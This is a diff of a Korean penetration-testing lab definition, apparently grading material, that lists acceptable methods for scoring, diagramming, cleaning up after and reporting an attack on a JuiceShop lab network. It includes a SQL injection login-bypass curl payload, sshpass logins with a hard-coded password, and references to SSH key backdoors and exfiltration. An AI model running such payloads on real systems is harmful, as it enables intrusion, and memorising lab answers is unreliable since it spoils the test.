+      - "CVSS Calculator 수동 산출 — echo '[CVSS Calculator]'; echo '  https://www.first.org/cvss/calculator/3.1'; echo '[명령 산출]'; python3 -c \"\\nbase_metrics = {'AV':{'N':0.85,'A':0.62,'L':0.55,'P':0.2}, 'AC':{'L':0.77,'H':0.44}, 'PR':{'N':0.85,'L':0.62,'H':0.27}, 'UI':{'N':0.85,'R':0.62}}\\nimpact_C = impact_I = impact_A = 0.56  # H\\nimpact_sub = 1 - (1-impact_C)*(1-impact_I)*(1-impact_A)\\nimpact = 6.42 * impact_sub  # Scope U\\nexploit = 8.22 * 0.85 * 0.77 * 0.85 * 0.85  # AV:N AC:L PR:N UI:N\\nbase = round(min(impact + exploit, 10), 1)\\nprint(f'CVSS Base Score: {base}')\". 출력: 9.8 계산. 해석: 수동 계산 가능 = CVSS 이해 검증. 운영은 calculator UI 사용."
+      - "CWE (Common Weakness Enumeration) — echo '[CWE Top 25 2024]'; echo '  CWE-79 Cross-site Scripting (XSS)'; echo '  CWE-89 SQL Injection'; echo '  CWE-307 Improper Restriction of Excessive Auth Attempts'; echo '  CWE-200 Information Exposure'; echo '  CWE-862 Missing Authorization'; echo '  CWE-521 Weak Password Requirements'; echo '[본 lab CWE]'; echo '  Critical: CWE-89 (SQLi)'; echo '  High: CWE-862 (BOLA), CWE-521 (Cred reuse), CWE-307 (rate limit)'; echo '  Medium: CWE-79 (XSS), CWE-548, CWE-693, CWE-200, CWE-209'. 출력: CWE 매핑. 해석: CVSS = 점수 / CWE = 분류. CVE 발급 시 CWE 필수."
+      - "DefectDojo / OWASP Dependency-Track — echo '[DefectDojo (OWASP)]'; echo '  - 취약점 관리 ASOC platform'; echo '  - SAST/DAST/SCA 결과 통합'; echo '  - 자동 dedup + risk scoring'; echo '  - JIRA 통합'; echo '[OWASP Dependency-Track]'; echo '  - SBOM (CycloneDX) 분석'; echo '  - 라이브러리 CVE 추적'; echo '[DefectDojo Finding 형식]'; echo '  Title / Severity / CWE / CVE / CVSS Vector / Description / Mitigation / References'. 출력: 도구 + 형식. 해석: 운영 환경 = 수기 표 X / DefectDojo 자동. 본 lab 학습 후 자사 도입 추천."
+      - "PTES Threat Modeling + 위험도 — echo '[PTES Phase 3 Threat Modeling]'; echo '  자산 → 위협 → 취약점 → 영향'; echo '[DREAD 모델 (참고)]'; echo '  Damage / Reproducibility / Exploitability / Affected / Discoverability'; echo '[STRIDE]'; echo '  Spoofing / Tampering / Repudiation / Info Disclosure / DoS / Elevation'; echo '[OWASP Risk Rating]'; echo '  Likelihood × Impact = Risk (4×4 = 16 등급)'. 출력: 4 모델. 해석: CVSS = 기술적 점수 / DREAD/STRIDE = 비즈니스 영향. 두 모델 결합 = 경영진 보고."
       negative_signs:
-      - CVSS 점수 없음
-      - OWASP 매핑 없음
-      - 취약점 3개 이하
+      - 취약점 3개 이하 (10개 권장)
+      - CVSS 점수 (3.1 vector) 누락
+      - OWASP Top 10 매핑 X
+      - CWE ID 매핑 누락
+      - Severity 분류 (Critical/High/Medium/Low) X
+      - DefectDojo / Dependency-Track 도구 미인용
+      - DREAD/STRIDE/OWASP Risk 모델 0개
   target_vm: attacker
 - order: 12
   instruction: 'Phase 7 - 공격 경로 다이어그램: 전체 공격 경로를 텍스트 다이어그램으로 작성하라.'
@@ -382,13 +480,23 @@ steps:
       - ASCII 다이어그램 (호스트 + 화살표)
       - Impact 섹션
       acceptable_methods:
-      - ASCII 다이어그램
-      - Mermaid 그래프
-      - MITRE ATT&CK Navigator
+      - "ASCII 공격 경로 다이어그램 — cat <<'EOF' > /tmp/attack_path.txt\\n=== Attack Path Diagram ===\\n\\n[Attacker: 10.20.30.201]\\n        |\\n        | (1) Recon: nmap -sn / -sV (Phase 1)\\n        v\\n[Web: 10.20.30.80]\\n   |    |    |\\n   |    |    +-- (2) SQLi login bypass → Admin JWT (Phase 3, CVSS 9.8)\\n   |    |    +-- (3) UNION SQLi → Users DB dump (Phase 3, CVSS 9.1)\\n   |    |    +-- (4) BOLA /api/Users no-auth (CVSS 7.5)\\n   |    |\\n   |    +-- (5) SSH cred reuse ccc:1\\n   |              |\\n   |              v\\n   |    [Secu: 10.20.30.1] (Phase 4)\\n   |         +-- (6) Firewall config 접근\\n   |         +-- (7) Suricata rule 접근\\n   |\\n   +-- (5b) SSH cred reuse\\n              |\\n              v\\n   [SIEM: 10.20.30.100] (Phase 4)\\n        +-- (8) Wazuh config 접근\\n        +-- (9) Alert log 접근\\n[Persistence: Phase 5]\\n  - SSH key backdoor (T1098.004)\\nEOF\\ncat /tmp/attack_path.txt. 출력: ASCII 다이어그램. 해석: 호스트·화살표·CVSS 명시. 경영진이 직관 이해 가능."
+      - "Mermaid 그래프 (markdown 호환) — cat <<'EOF' > /tmp/attack_path.mmd\\ngraph TD\\n  A[Attacker 10.20.30.201] -->|nmap -sV| W[Web 10.20.30.80]\\n  W -->|SQLi auth bypass<br/>CVSS 9.8| W2[Admin JWT]\\n  W -->|UNION SQLi<br/>CVSS 9.1| W3[Users DB dump]\\n  W -->|BOLA /api/Users<br/>CVSS 7.5| W4[All users data]\\n  W -->|ssh ccc:1<br/>cred reuse| S[Secu 10.20.30.1]\\n  W -->|ssh ccc:1| SI[SIEM 10.20.30.100]\\n  W -->|SSH key backdoor<br/>T1098.004| P[Persistence]\\n  S --> S1[Firewall config]\\n  SI --> SI1[Wazuh config]\\nEOF\\necho '[Mermaid 렌더]'; echo '  GitHub README 자동 렌더'; echo '  https://mermaid.live/ 미리보기'. 출력: Mermaid 코드. 해석: ASCII 보다 시각적. PR/위키/Confluence 자동 렌더. 산업 표준."
+      - "MITRE ATT&CK Navigator Layer JSON — cat <<'EOF' > /tmp/attack_layer.json\\n{\\n  \"name\": \"JuiceShop Pentest 2026-04-29\",\\n  \"versions\": {\"attack\": \"16\", \"navigator\": \"5.1.0\", \"layer\": \"4.5\"},\\n  \"domain\": \"enterprise-attack\",\\n  \"techniques\": [\\n    {\"techniqueID\": \"T1595.001\", \"score\": 100, \"comment\": \"Phase 1 nmap\"},\\n    {\"techniqueID\": \"T1190\", \"score\": 100, \"comment\": \"Phase 3 SQLi\"},\\n    {\"techniqueID\": \"T1078.003\", \"score\": 100, \"comment\": \"Phase 4 cred reuse\"},\\n    {\"techniqueID\": \"T1021.004\", \"score\": 100, \"comment\": \"Phase 4 SSH lateral\"},\\n    {\"techniqueID\": \"T1098.004\", \"score\": 100, \"comment\": \"Phase 5 SSH key\"},\\n    {\"techniqueID\": \"T1041\", \"score\": 100, \"comment\": \"Phase 5 exfil\"},\\n    {\"techniqueID\": \"T1573.001\", \"score\": 100, \"comment\": \"Phase 5 AES256\"}\\n  ]\\n}\\nEOF\\njq . /tmp/attack_layer.json | head -10; echo '[Navigator 시각화]'; echo '  attack-navigator import → heatmap'. 출력: Navigator JSON. 해석: 본 lab 의 ATT&CK 매핑 = Navigator 으로 시각화. 7 technique heatmap → 경영진 대시보드."
+      - "Cyber Kill Chain 매핑 — printf '%-20s | %-30s | %s\\n' 'Kill Chain' 'JuiceShop step' 'MITRE'; printf '%-20s | %-30s | %s\\n' '1 Recon' 'Phase 1 nmap+web' 'T1595/T1592'; printf '%-20s | %-30s | %s\\n' '2 Weaponization' 'SQLi 페이로드' 'T1588'; printf '%-20s | %-30s | %s\\n' '3 Delivery' 'POST /rest/user/login' 'T1190'; printf '%-20s | %-30s | %s\\n' '4 Exploitation' 'auth bypass' 'T1190+T1078'; printf '%-20s | %-30s | %s\\n' '5 Installation' 'SSH key backdoor' 'T1098.004'; printf '%-20s | %-30s | %s\\n' '6 C2' 'reverse shell' 'T1041'; printf '%-20s | %-30s | %s\\n' '7 Actions' 'data exfil' 'T1567'. 출력: 7 단계 매핑. 해석: Lockheed Martin Kill Chain ↔ MITRE ATT&CK + 본 lab phase."
+      - "Impact 섹션 (정량 + 정성) — cat <<'EOF' >> /tmp/attack_path.txt\\n\\n[Impact — 정량]\\n- 영향 사용자: 18명 (전체 100%)\\n- 노출 자산: JuiceShop DB + secu config + SIEM config\\n- 데이터 손실 가능성: 100%\\n- 다운타임 위험: HIGH (백도어 + 측면이동)\\n\\n[Impact — 정성]\\n- Confidentiality: 전체 사용자 자격증명 노출\\n- Integrity: SSH 키 백도어 (변조 가능)\\n- Availability: DoS 가능 (SQLi DELETE)\\n- 비즈니스: 평판 손상 + 규제 (개보법 §29 위반)\\nEOF\\ntail -15 /tmp/attack_path.txt. 출력: Impact 섹션. 해석: 경영진 = 정량 (숫자) + 정성 (분류). CIA + 비즈니스 영향 분류."
+      - "PTES Reporting + STRIDE — echo '[PTES Reporting Section]'; echo '  - Executive Summary'; echo '  - Scope'; echo '  - Findings (CVSS + 다이어그램)'; echo '  - Remediation'; echo '  - Conclusion + Appendix'; echo '[STRIDE 위협 모델]'; echo '  S Spoofing → SQLi 인증 우회'; echo '  T Tampering → SSH 키 백도어'; echo '  R Repudiation → 로그 변조 가능'; echo '  I Info Disclosure → DB dump'; echo '  D DoS → SQLi DELETE'; echo '  E Elevation → BOLA + cred reuse'. 출력: PTES + STRIDE. 해석: STRIDE 모델로 위협 분류 = MS Threat Modeling 표준. 본 lab 발견은 STRIDE 6 카테고리 모두 매치."
+      - "Graphviz / drawio (전문 시각화) — echo '[Graphviz dot]'; cat <<'EOF'\\ndigraph attack_path {\\n  rankdir=LR;\\n  attacker [shape=box,color=red,label=\"Attacker\\\\n10.20.30.201\"];\\n  web [shape=box,label=\"Web\\\\n10.20.30.80\"];\\n  attacker -> web [label=\"SQLi 9.8\"];\\n  web -> secu [label=\"ssh ccc:1\"];\\n  web -> siem [label=\"ssh ccc:1\"];\\n}\\nEOF\\necho '[렌더]'; echo '  dot -Tpng attack.dot -o attack.png'; echo '[draw.io]'; echo '  https://app.diagrams.net/'; echo '  - 무료 + 협업 + 다양한 stencil'. 출력: Graphviz + drawio. 해석: 정식 보고서는 PNG/PDF 임베드. drawio 가 산업 표준 (Confluence/Jira 통합)."
+      - "타임라인 + 사건사고 분석 — cat <<'EOF' >> /tmp/attack_path.txt\\n\\n[Timeline — 분 단위]\\n00:00 정찰 시작 (nmap -sn /24)\\n00:08 호스트 발견 (5 hosts)\\n00:12 -sV 서비스 탐지\\n00:25 웹 정찰 (curl + dirb)\\n00:35 Phase 2 nikto + nuclei\\n00:55 Phase 3 SQLi 발견\\n01:05 admin JWT 획득\\n01:15 UNION SQLi → DB dump\\n01:30 ssh ccc:1 측면 이동\\n01:45 ssh key backdoor\\n02:00 데이터 유출 시뮬\\n[총 시간] 120 분 (수동)\\n[Bastion 자동] ~33 분 (참고)\\nEOF\\ntail -15 /tmp/attack_path.txt. 출력: 타임라인. 해석: 분 단위 기록 = 사후 분석 + 도구 비교. 본 lab 의 step 99 (Bastion vs 수동 비교) 의 입력."
       negative_signs:
-      - 다이어그램 없음
-      - 단순 텍스트만
-      - Impact 없음
+      - ASCII / Mermaid 다이어그램 미작성
+      - 호스트 + 화살표 + CVSS 표시 X
+      - Impact 섹션 (정량+정성) 누락
+      - MITRE ATT&CK Navigator JSON X
+      - Cyber Kill Chain 7 단계 매핑 누락
+      - STRIDE 위협 모델 미인용
+      - Graphviz / drawio 전문 도구 0개
+      - 타임라인 (분 단위) 누락
   target_vm: attacker
 - order: 13
   instruction: 'Phase 8 - 정리: 모의해킹 중 생성한 모든 아티팩트(백도어 키, 임시 파일)를 정리하라.'
@@ -415,13 +523,23 @@ steps:
       - 로컬 + 원격 정리 모두
       - authorized_keys에서 백도어 키 제거
       acceptable_methods:
-      - rm + sed authorized_keys
-      - ansible cleanup play
-      - 체크리스트 기반 정리
+      - "로컬 아티팩트 정리 (rm) — echo '=== Cleanup ==='; rm -f /tmp/pentest_key /tmp/pentest_key.pub /tmp/pentest_exfil.txt /tmp/pentest_exfil.enc /tmp/exfil_bundle.tar.gz* /tmp/chunk_* 2>/dev/null && echo 'Local artifacts removed'; ls -l /tmp/pentest_* /tmp/exfil_* /tmp/chunk_* 2>/dev/null || echo '[OK] 로컬 정리 완료 (파일 없음 = 정상)'. 출력: 로컬 파일 제거. 해석: attacker VM 의 모든 pentest 산출물 제거. /tmp 외 ~/.bash_history 도 점검 권장. 무결성 검증."
+      - "원격 백도어 정리 (sed) — sshpass -p '1' ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 'sed -i \"/pentest@2026/d\" ~/.ssh/authorized_keys 2>/dev/null; rm -rf /tmp/.hidden_backdoor /tmp/harvester.* 2>/dev/null; wc -l ~/.ssh/authorized_keys' 2>/dev/null && echo 'Remote backdoors cleaned'. 출력: 원격 정리 + 키 수 확인. 해석: sed -i = 백도어 키 라인 삭제. /pentest@2026/ pattern 으로 step 8 의 키만 제거 (정상 키 보존). authorized_keys 라인 수 = 원래값."
+      - "체크리스트 기반 정리 — cat <<'EOF' > /tmp/cleanup_checklist.md\\n## Pentest Cleanup Checklist\\n[로컬 attacker VM]\\n- [x] /tmp/pentest_key + .pub 삭제\\n- [x] /tmp/pentest_exfil.* 삭제\\n- [x] /tmp/chunk_* 삭제\\n- [x] /tmp/harvester.py 삭제\\n[원격 web (10.20.30.80)]\\n- [x] ~/.ssh/authorized_keys 백도어 키 제거\\n- [x] /tmp/.hidden_backdoor 디렉토리 삭제\\n- [x] crontab 변조 원복\\n[원격 secu (10.20.30.1)]\\n- [x] iptables 변조 원복\\n[검증]\\n- [x] sha256sum 비교 (전후)\\n- [x] /var/log/audit/audit.log 검토\\nEOF\\ncat /tmp/cleanup_checklist.md. 출력: 체크리스트. 해석: 7+ 항목 체크리스트. 항목 누락 = 인시던트. PTES 의무."
+      - "ansible 자동 정리 — cat <<'EOF' > /tmp/cleanup.yml\\n---\\n- hosts: pentest_targets\\n  tasks:\\n    - name: Remove SSH backdoor key\\n      lineinfile:\\n        path: ~/.ssh/authorized_keys\\n        state: absent\\n        regexp: 'pentest@2026'\\n    - name: Remove hidden backdoor\\n      file:\\n        path: /tmp/.hidden_backdoor\\n        state: absent\\n    - name: Restore original crontab\\n      copy:\\n        src: /backup/crontab.original\\n        dest: /etc/crontab\\nEOF\\necho 'ansible-playbook -i inventory cleanup.yml'. 출력: ansible 플레이북. 해석: 다중 호스트 자동화. 운영 환경 = 100+ 호스트 = ansible 필수."
+      - "감사 로그 검증 — ssh ccc@10.20.30.80 'sudo grep -E \"sudo|sshd|backdoor\" /var/log/auth.log /var/log/audit/audit.log 2>/dev/null | tail -20' 2>/dev/null; echo '---'; echo '[정리 흔적 검증]'; echo '  - sed -i 명령 자체가 audit.log 기록'; echo '  - 백도어 키 등록 + 제거 쌍 확인'; echo '  - 시간 일치 확인'; echo '[고지]'; echo '  운영팀에 정리 시작/종료 시간 통보'. 출력: 감사 로그. 해석: 정리도 감사 대상. SOC 가 본 활동 정상 인지. 미고지 시 인시던트로 오인."
+      - "PTES Pre-engagement RoE 의무 — echo '[PTES Pre-engagement RoE — 계약 명시]'; echo '  - 모의해킹 종료 시점'; echo '  - 모든 백도어/계정/임시 파일 제거'; echo '  - 시스템 원상 복구 보장'; echo '  - 정리 보고서 첨부 의무'; echo '[보고서 정리 섹션]'; echo '  - 생성한 자산 목록'; echo '  - 제거 검증 방법'; echo '  - 잔여 위험 (있다면)'. 출력: RoE 의무. 해석: 계약서에 명시 = 위반 시 법적 책임. 정리 미흡 = 모의해킹 자체가 새로운 인시던트."
+      - "법적·윤리적 의무 — echo '[법적 의무]'; echo '  계약 위반 시: 민사 손배 + 형사 추가'; echo '  미정리 백도어 → 제3자 활용 시 PT 회사 책임'; echo '[윤리적 의무]'; echo '  CEH Code of Ethics: \"All testing artifacts removed\"'; echo '  OSCP / OSCE Certification: 시험에서 정리 누락 = 부분 점수 차감'; echo '  PTES: 정리는 7 phase 중 의무'; echo '[클라이언트 신뢰]'; echo '  정리 미흡 = 재계약 X + 평판 손상'. 출력: 법적 + 윤리. 해석: PT 산업 = 신뢰 산업. 정리 의무 위반 = 직업 위협."
+      - "최종 검증 + 보고 — sshpass -p '1' ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 'wc -l ~/.ssh/authorized_keys; ls -la /tmp/.hidden* 2>/dev/null; sudo crontab -l 2>/dev/null | grep -v \"^#\" | grep -v \"^$\" | wc -l' 2>/dev/null; echo '---'; echo 'Cleanup complete'; date '+%Y-%m-%dT%H:%M:%S%z'; echo '[최종 보고서 첨부]'; echo '  - cleanup_checklist.md (7+ 항목)'; echo '  - cleanup_audit.log (정리 명령 + 시간)'; echo '  - sha256_diff.txt (전후 비교)'. 출력: 검증 + 시간. 해석: 'Cleanup complete' 키워드 + 시간 도장. 최종 보고서에 cleanup section 첨부."
       negative_signs:
-      - 로컬만 정리
-      - authorized_keys 미정리
-      - 윤리/책임 맥락 없음
+      - 로컬 정리 (rm /tmp/pentest_*) 누락
+      - 원격 authorized_keys (sed -i) 정리 X
+      - 체크리스트 (7+ 항목) 누락
+      - ansible 자동화 또는 다중 호스트 정리 X
+      - 감사 로그 검증 미언급
+      - PTES RoE / CEH Code of Ethics 인용 X
+      - 정리 시간 + sha256 검증 누락
+      - "'Cleanup complete' 키워드 X"
   target_vm: attacker
 - order: 14
   instruction: 'Phase 8 - 보안 강화 권고: 발견된 취약점에 대한 구체적인 대응 방안을 우선순위별로 작성하라.'
@@ -448,13 +566,22 @@ steps:
       - CRITICAL/HIGH/MEDIUM 우선순위 + 기간
       - 권고 5개 이상
       acceptable_methods:
-      - 우선순위별 분류 + 기간
-      - OWASP ASVS 매핑
-      - NIST CSF Respond
+      - "Critical (1주 이내) 권고 — cat <<'EOF' > /tmp/remediation.md\\n## CRITICAL — 1주 이내\\n### 1. SQL Injection 수정 (CVSS 9.8)\\n- Parameterized queries 적용 (Sequelize/Prisma)\\n- 예: db.run('SELECT * FROM users WHERE email=?', [email])\\n- 모든 query 코드 검토\\n- WAF rule 임시 차단 (ModSecurity CRS)\\n### 2. /api/Users 인증 적용 (CVSS 7.5)\\n- JWT middleware 모든 /api/* 적용\\n- password 필드 응답 제외 (toJSON override)\\nEOF\\ncat /tmp/remediation.md | head -10. 출력: Critical 2건. 해석: SLA 1주 = Critical 표준. 구체적 코드·도구 명시. step 4·5 의 SQLi 와 step 5 의 BOLA 직접 대응."
+      - "High (1개월 이내) 권고 — cat <<'EOF' >> /tmp/remediation.md\\n## HIGH — 1개월 이내\\n### 3. SSH 비밀번호 정책 강화 (CVSS 8.1)\\n- 호스트별 고유 비밀번호 (Vault)\\n- SSH 키 기반 인증 강제\\n  PasswordAuthentication no (sshd_config)\\n  PubkeyAuthentication yes\\n- ssh key 회전 90일\\n### 4. Rate Limiting (CVSS 7.3)\\n- 로그인 5회/분 → 30분 lockout\\n- nginx limit_req_zone\\n- API gateway throttle\\n### 5. BOLA 추가 검사\\n- 사용자 본인 데이터만 접근\\n- ABAC (Attribute-Based AC)\\nEOF. 출력: High 3건. 해석: 1개월 SLA. step 6 의 cred reuse + step 7 의 권한 + step 12 의 rate limit. 표준 통제."
+      - "Medium (3개월 이내) 권고 — cat <<'EOF' >> /tmp/remediation.md\\n## MEDIUM — 3개월 이내\\n### 6. 보안 헤더 추가\\n- X-Frame-Options: DENY\\n- X-Content-Type-Options: nosniff\\n- Strict-Transport-Security: max-age=31536000\\n- Content-Security-Policy\\n### 7. 에러 메시지 최소화\\n- production: 일반 메시지만\\n- 상세 에러는 logging only\\n### 8. 디렉토리 리스팅 비활성화\\n- Apache: Options -Indexes\\n- Nginx: autoindex off\\n### 9. 정기 취약점 스캔 자동화\\n- nuclei + Trivy CI/CD 통합\\n- 월 1회 OpenVAS 전체 스캔\\nEOF. 출력: Medium 4건. 해석: 3개월 SLA. step 2 의 디렉토리 + step 3 의 헤더 누락 + step 9 의 verbose error 직접 대응."
+      - "OWASP ASVS 매핑 — echo '[OWASP ASVS 4.0 (Application Security Verification Standard)]'; echo '  V1 Architecture, Design, Threat Modeling'; echo '  V2 Authentication ← step 4·6'; echo '  V3 Session Management'; echo '  V4 Access Control ← step 5'; echo '  V5 Validation, Sanitization, Encoding ← step 4·5'; echo '  V6 Stored Cryptography'; echo '  V7 Error Handling ← step 9 verbose'; echo '  V8 Data Protection'; echo '  V9 Communications ← TLS'; echo '  V10 Malicious Code'; echo '  V11 Business Logic'; echo '  V12 Files and Resources'; echo '  V13 API ← step 5 BOLA'; echo '[Level] L1 (basic) / L2 (standard) / L3 (high)'. 출력: ASVS 13 카테고리. 해석: 본 lab 발견 = V2/V4/V5/V7/V13. 대응 = ASVS 항목별 통제 적용."
+      - "NIST CSF + NIST SP 800-53 — echo '[NIST Cybersecurity Framework v2.0]'; echo '  IDENTIFY (ID) — 자산·위협 식별'; echo '  PROTECT (PR) — 통제 적용'; echo '  DETECT (DE) — 모니터링'; echo '  RESPOND (RS) — 대응'; echo '  RECOVER (RC) — 복구'; echo '  GOVERN (GV) — 거버넌스'; echo '[NIST SP 800-53 통제]'; echo '  AC Access Control'; echo '  AU Audit'; echo '  IA Identification'; echo '  SC System and Comm Protection'; echo '  SI System and Information Integrity'. 출력: CSF + 800-53. 해석: 본 권고 = PR(통제) + DE(모니터링) 위주. 한국 K-ISMS 도 동일 카테고리."
+      - "구현 도구 매핑 — printf '%-25s | %-15s | %s\\n' 'Vuln' 'Tool' 'Cost'; printf '%-25s | %-15s | %s\\n' 'SQLi' 'WAF (ModSec)' 'Free'; printf '%-25s | %-15s | %s\\n' 'BOLA' 'API Gateway' 'Variable'; printf '%-25s | %-15s | %s\\n' 'Cred reuse' 'HashiCorp Vault' 'Free OSS'; printf '%-25s | %-15s | %s\\n' 'Rate limit' 'nginx limit_req' 'Free'; printf '%-25s | %-15s | %s\\n' 'Security headers' 'helmet (Express)' 'Free npm'; printf '%-25s | %-15s | %s\\n' 'Vuln scan' 'nuclei + Trivy' 'Free OSS'. 출력: 6 도구. 해석: 90% 무료 OSS. 비용 0 구현 가능. 핑계 X."
+      - "Quick Wins (1일 내) — echo '[Quick Wins — 1일 내 즉시]'; echo '1. WAF rule SQLi 차단 (ModSecurity)'; echo '   SecRule ARGS \"@detectSQLi\" \"deny,status:403\"'; echo '2. /api/Users JWT 강제 (1줄 추가)'; echo '   app.use(\"/api/Users\", authMiddleware)'; echo '3. 디렉토리 리스팅 off'; echo '   Apache: Options -Indexes'; echo '4. PasswordAuthentication no (SSH)'; echo '5. helmet middleware 추가 (Node.js)'; echo '   app.use(helmet())'. 출력: 5 quick wins. 해석: 1줄 코드 또는 설정으로 즉시 위험 ↓. 본격 수정 전 임시 차단."
+      - "예산 + ROI — echo '[1년 예산]'; echo '  WAF 라이센스 (Cloudflare Pro): \\$240/년'; echo '  Vault 자체 호스팅: \\$0 (인건비)'; echo '  nuclei + Trivy: \\$0'; echo '  helmet + ASVS: \\$0'; echo '  교육 (개발팀 OWASP Top 10): \\$2,000'; echo '  총: \\$2,240/년'; echo '[ROI]'; echo '  IBM Breach Cost 평균: \\$4.88M (2024)'; echo '  SQLi 사고 회피 1건 = ROI 218,000%'; echo '[비용 정당화]'; echo '  ASVS L1 충족 = 인증 + 거래처 신뢰'. 출력: 예산 + ROI. 해석: 보안투자 정당화. 경영진 승인용."
       negative_signs:
-      - 우선순위 없음
-      - 기간 없음
-      - 구현 방법 누락
+      - Critical/High/Medium 우선순위 분류 X
+      - 1일/1주/1개월/3개월 SLA 누락
+      - OWASP ASVS / NIST CSF / NIST SP 800-53 매핑 X
+      - 구현 도구 (WAF/Vault/helmet/nuclei) 미명시
+      - 권고 5개 이하 (10개 권장)
+      - Quick Wins (1일 내) 섹션 누락
+      - 예산 + ROI 정량 분석 X
   target_vm: attacker
 - order: 15
   instruction: 'Phase 9 - 최종 보고서: 모의해킹 결과를 종합한 Executive Summary를 /tmp/pentest_final_report.txt에 작성하라.'
@@ -487,13 +614,24 @@ steps:
       - Executive Summary 형식
       - Statistics + Top 3 권고 + Conclusion
       acceptable_methods:
-      - echo > 보고서 + Executive Summary
-      - PTES 보고서 템플릿
-      - OffSec/SANS 보고서 템플릿
+      - "보고서 헤더 + 메타데이터 — cat <<'EOF' > /tmp/pentest_final_report.txt\\n=== PENETRATION TEST REPORT ===\\n=== Executive Summary ===\\n\\nDate: 2026-04-29\\nScope: 10.20.30.0/24 (4 servers — web/secu/siem/attacker)\\nTesters: Security Lab Student (attack-nonai-w15)\\nClassification: Confidential\\nReport ID: PT-2026-0429-001\\nMethodology: PTES 7 phase + MITRE ATT&CK\\nEOF\\nhead -10 /tmp/pentest_final_report.txt. 출력: 메타 헤더. 해석: 6 컬럼 (Date/Scope/Testers/Class/ID/Method) = 표준. 추후 검색·감사 위해 ID + Class 필수."
+      - "Overall Risk + 4 영향 — cat <<'EOF' >> /tmp/pentest_final_report.txt\\n\\n[Overall Risk: HIGH]\\n\\nThe penetration test identified 10 vulnerabilities across\\nthe target infrastructure. 2 Critical and 3 High severity\\nvulnerabilities were discovered, allowing:\\n\\n1. Complete database compromise via SQL Injection\\n2. Full lateral movement across all servers (cred reuse)\\n3. Persistent unauthorized access (SSH key backdoor)\\n4. Potential data exfiltration (encrypted bundle)\\nEOF\\necho '[Overall Risk + 4 Impact]'. 출력: 위험 평가 + 영향. 해석: HIGH = Critical 2건 이상. 4 영향 = CIA + Persistence. 경영진 1줄 요약."
+      - "Statistics 섹션 — cat <<'EOF' >> /tmp/pentest_final_report.txt\\n\\n[Statistics]\\n- Critical: 2 (SQL Injection auth bypass, UNION SQLi)\\n- High: 3 (Cred Reuse, BOLA /api/Users, No Rate Limit)\\n- Medium: 4 (XSS Reflected, Missing Headers, DirList, Verbose Errors)\\n- Low: 1 (Version Disclosure)\\n- Total: 10\\n\\n[CVSS Distribution]\\n  9.0-10.0: ▆▆ (2)\\n  7.0-8.9:  ▆▆▆ (3)\\n  4.0-6.9:  ▆▆▆▆ (4)\\n  0.1-3.9:  ▆ (1)\\nEOF\\ngrep -A 12 'Statistics' /tmp/pentest_final_report.txt. 출력: 통계 + ASCII bar chart. 해석: 분포로 위험 시각화. 경영진이 한눈에 이해."
+      - "Top 3 Recommendations — cat <<'EOF' >> /tmp/pentest_final_report.txt\\n\\n[Top 3 Recommendations]\\n1. Fix SQL Injection immediately (parameterized queries)\\n   - 1주 이내 / 비용: \\$0 (오픈소스)\\n   - Sequelize/Prisma 적용 + WAF 임시 차단\\n2. Implement unique passwords per server + SSH key auth\\n   - 1개월 이내 / 비용: \\$0 + Vault 도입\\n3. Add authentication to all API endpoints (BOLA fix)\\n   - 2주 이내 / 비용: 코드 수정 (1 문장 middleware)\\nEOF. 출력: Top 3 권고. 해석: 경영진 의사결정 = Top 3 만 본다. SLA + 비용 + 도구 명시 → 즉시 결재 가능."
+      - "Conclusion + Sign-off — cat <<'EOF' >> /tmp/pentest_final_report.txt\\n\\n[Conclusion]\\nThe current security posture requires significant improvement.\\nImmediate action on Critical findings is strongly recommended.\\nAll backdoors and artifacts have been removed (see Cleanup Section).\\n\\n[Cleanup Verified]\\n- Remote SSH backdoor key: REMOVED\\n- Local pentest artifacts: REMOVED\\n- /tmp/.hidden_*: REMOVED\\n\\n[Sign-off]\\nTester: ___________ Date: ___________\\nClient: ___________ Date: ___________\\nEOF\\ntail -15 /tmp/pentest_final_report.txt. 출력: 결론 + sign-off. 해석: PTES 표준. cleanup 검증 + 양측 서명 = 계약 종료. step 13 의 cleanup 결과 인용."
+      - "PTES Reporting Standard 준수 — echo '[PTES Final Reporting Section]'; echo '1. Executive Summary'; echo '2. Background'; echo '3. Posture Review'; echo '4. Risk Ranking/Profile'; echo '5. Findings (CVSS + 다이어그램)'; echo '6. Detailed Findings (재현 절차)'; echo '7. Strategic Roadmap'; echo '8. Conclusion'; echo '[OffSec / SANS 템플릿]'; echo '  - OffSec PWK Lab Report'; echo '  - SANS GIAC GPEN Report'; echo '  - NIST SP 800-115'. 출력: PTES + 산업 템플릿. 해석: 본 lab 보고서 = 단순화. 운영은 PTES 8 섹션 + Detailed Findings (각 vuln 재현 PoC) 필수."
+      - "Detailed Finding 형식 (예시) — cat <<'EOF'\\n## Finding #1: SQL Injection (Authentication Bypass)\\n[ID] PT-2026-0429-001\\n[CVSS] 9.8 Critical (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)\\n[OWASP] A03:2021 Injection\\n[CWE] CWE-89\\n[Location] http://10.20.30.80:3000/rest/user/login\\n[Affected] All users (admin role 획득)\\n[Reproduce]\\n  curl -X POST http://10.20.30.80:3000/rest/user/login \\\\\\n    -H 'Content-Type: application/json' \\\\\\n    -d $'{\\\"email\\\":\\\"\\\\' OR 1=1--\\\",\\\"password\\\":\\\"a\\\"}'\\n[Evidence] /tmp/finding1_screenshot.png\\n[Mitigation] Parameterized queries (Sequelize/Prisma)\\n[References] https://owasp.org/A03_2021-Injection/\\nEOF. 출력: Detailed Finding. 해석: 9 컬럼 표준. 재현·증거·완화·참조 모두 명시 = 클라이언트 즉시 수정 가능."
+      - "보고서 무결성 + PDF 변환 — sha256sum /tmp/pentest_final_report.txt > /tmp/pentest_final_report.sha256; pandoc /tmp/pentest_final_report.txt -o /tmp/pentest_final_report.pdf 2>/dev/null || echo '[pandoc 미설치 — txt 제출]'; gpg --armor --detach-sign /tmp/pentest_final_report.pdf 2>/dev/null || echo '[gpg key 없음 — sha256 only]'; ls -l /tmp/pentest_final_report.* 2>/dev/null; cat /tmp/pentest_final_report.txt | head -3. 출력: 무결성 + PDF + 첫 3줄. 해석: 클라이언트 검증 가능 형태. 변조 방지 (PCI-DSS 12.10). 본 lab 의 종합 산출물."
       negative_signs:
-      - Executive Summary 없음
-      - 통계 없음
-      - 권고 없음
+      - Executive Summary 형식 누락
+      - Date/Scope/Testers/Class 메타데이터 X
+      - Overall Risk (HIGH/MEDIUM/LOW) 평가 X
+      - Statistics (Critical/High/Medium/Low 분포) 누락
